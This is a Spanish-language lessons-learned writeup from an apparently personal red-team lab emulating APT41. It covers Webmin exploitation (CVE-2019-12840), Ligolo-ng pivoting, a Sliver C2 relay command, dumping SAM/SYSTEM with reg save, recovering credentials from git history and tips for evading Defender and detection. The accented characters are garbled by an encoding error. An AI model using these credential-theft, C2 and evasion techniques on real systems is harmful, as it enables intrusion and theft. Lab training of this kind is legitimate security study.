# Lessons Learned ÔÇö Operaci├│n SILENT BRIDGE
## Lab-02: Silent Bridge ÔÇö APT41 Emulation
**Operaci├│n:** SILENT BRIDGE | **Adversario:** APT41 | **Framework:** MITRE ATT&CK v14  
**Operador:** Adri├ín Camacho | **Fecha:** 13-15/05/2026

---

## Lecciones por categor├¡a

| # | Lecci├│n | Categor├¡a |
|---|---------|-----------|
| 1 | Ubuntu 26.04 incompatible con Webmin 1.890 ÔÇö usar Ubuntu 22.04 LTS para labs con software legacy | Infraestructura |
| 2 | `50-cloud-init.yaml` sobreescribe netplan ÔÇö eliminarlo siempre + a├▒adir `dhcp4: false` | Infraestructura |
| 3 | Interfaces tuntap de Ligolo-ng no persisten entre reinicios ÔÇö recrear al arrancar el lab | Pivoting |
| 4 | Verificar `tunnel_list` antes de operar ÔÇö el t├║nel puede caerse sin aviso | Pivoting |
| 5 | Ligolo-ng v0.7.5 usa `session` con selecci├│n interactiva ÔÇö distinto a versiones anteriores | Pivoting |
| 6 | Beacon Sliver en red interna necesita relay ÔÇö `listener_add` en Ligolo-ng en PROD | C2 |
| 7 | CVE-2019-15107 bloqueado por `MINISERV_INTERNAL` ÔÇö pivotar a CVE-2019-12840 | Explotaci├│n |
| 8 | Metasploit inoperativo ÔÇö reconstruir exploit desde an├ílisis del m├│dulo Ruby de ExploitDB | Explotaci├│n |
| 9 | WinRM en Windows 11 con red P├║blica requiere `winrm quickconfig -force` | Acceso remoto |
| 10 | Tamper Protection solo se desactiva desde GUI ÔÇö no remotamente via PowerShell | Evasi├│n |
| 11 | `reg save HKLM\SAM` m├ís silencioso que LSASS dump ÔÇö no genera alertas de Mimikatz | Credential Access |
| 12 | Git history preserva credenciales aunque se limpien en commits posteriores | Credential Discovery |
| 13 | ICMP no funciona en t├║nel Ligolo-ng ÔÇö usar `nmap --unprivileged` para host discovery | Reconocimiento |
| 14 | Nombrar beacons en `C:\Users\<user>\Documents\` es detectable ÔÇö usar rutas m├ís discretas | OPSEC |

---

## Problemas encontrados y soluciones

| Fecha | Problema | Causa | Soluci├│n |
|-------|---------|-------|---------|
| 13/05/2026 | Ubuntu 26.04 incompatible con Webmin 1.890 | perlapi-5.38.2 vs perl 5.40 instalado | Reinstalar PROD con Ubuntu 22.04 LTS |
| 14/05/2026 | `50-cloud-init.yaml` sobreescribe IPs est├íticas | Cloud-init fuerza DHCP con prioridad num├®rica mayor | Eliminar `50-cloud-init.yaml` + `dhcp4: false` |
| 14/05/2026 | CVE-2019-15107 bloqueado | `MINISERV_INTERNAL` check l├¡nea 8 del CGI | Pivotar a CVE-2019-12840 autenticado |
| 14/05/2026 | Metasploit `uninitialized constant HTTP` | Bug namespace Ruby sin actualizar | Exploit Python construido desde `46984.rb` |
| 14/05/2026 | Ligolo-ng interfaz `linkdown` | Sesi├│n ca├¡da sin limpiar interfaz | `ip link delete ligolo` + reinicio proxy |
| 15/05/2026 | Evil-WinRM timeout en PC-01 | Perfil de red P├║blico bloquea WinRM | `winrm quickconfig -force` en PC-01 |
| 15/05/2026 | Beacon Sliver v1 no conecta | PC-01 sin visibilidad hacia Kali (10.0.2.x) | `listener_add` Ligolo-ng + beacon v2 ÔåÆ PROD |
| 15/05/2026 | Tamper Protection bloquea `Set-MpPreference` | Windows 11 protege Defender remotamente | Desactivar Tamper Protection desde GUI |

---

## Comparativa Lab-01 vs Lab-02

| Aspecto | Lab-01 (APT29 ÔÇö AD) | Lab-02 (APT41 ÔÇö Silent Bridge) |
|---------|--------------------|-----------------------|
| **Vector inicial** | Kerberos sin autenticaci├│n | Web RCE (CVE-2019-12840) |
| **Weaponizaci├│n** | Herramientas est├índar (Impacket) | Exploit Python construido manualmente |
| **Topolog├¡a** | Red plana (un segmento) | Red segmentada (tres nodos, dos segmentos) |
| **Pivoting** | No necesario | Ligolo-ng TLS tunnel |
| **Credenciales** | AS-REP Roasting / Kerberoasting | Git history |
| **C2** | Sliver directo en WKSTN-01 | Sliver via relay (Ligolo listener en PROD) |
| **Credential dump** | DCSync (dominio completo) | SAM/SYSTEM (local) |
| **Adversario** | APT29 (SVR Rusia) | APT41 (MSS China) |

---

## Conceptos t├®cnicos consolidados

**Ligolo-ng vs Chisel:** Ligolo-ng opera a nivel de kernel (tuntap) ÔÇö tr├ífico transparente para cualquier herramienta sin proxychains. Chisel requiere proxychains y limita Nmap a connect scan.

**Relay C2 con Ligolo-ng listener:** `listener_add --addr 0.0.0.0:443 --to 10.0.2.9:443` en PROD reenv├¡a el tr├ífico del beacon hacia Kali. Arquitectura multicapa caracter├¡stica de operaciones APT reales en redes segmentadas.

**reg save vs LSASS dump:** `reg save HKLM\SAM + SYSTEM` usa la shadow copy del registro ÔÇö m├ís silencioso que acceder a LSASS. Solo requiere `reg.exe` (LOLBin) + `impacket-secretsdump` offline.

**Git history como vector:** Un commit que "limpia" credenciales no las elimina del historial. `git show <commit>` las recupera siempre. Soluci├│n real: rotar credenciales + `git filter-repo`.

---

## Pendiente para labs futuros

| Tema | Lab objetivo |
|------|-------------|
| AMSI bypass en memoria sin GUI | Lab-07 (Lazarus) |
| Process injection + syscalls directas | Lab-07 (Lazarus) |
| Beacon con evasi├│n de PE header | Lab-07 (Lazarus) |
| Segundo pivote (tres segmentos) | Lab-09 (Holo) |

---

*Operaci├│n SILENT BRIDGE completada ÔÇö Adri├ín Camacho | Mayo 2026*
